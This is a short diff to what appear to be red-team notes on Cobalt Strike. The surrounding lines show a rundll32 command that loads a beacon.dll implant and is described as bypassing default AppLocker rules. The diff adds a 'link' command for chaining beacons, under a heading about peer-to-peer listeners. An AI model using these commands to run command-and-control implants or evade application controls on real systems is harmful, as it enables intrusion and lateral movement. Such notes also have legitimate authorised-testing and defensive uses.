@@ -20,6 +20,7 @@ cd /opt/cobaltstrike
 - Bypasses default applocker configuration
 ```
 C:\Windows\System32\rundll32.exe C:\Users\Administrator\Desktop\beacon.dll,StartW
+link <COMPUTERNAME>
 ```
 
 #### Create peer-to-peer listener
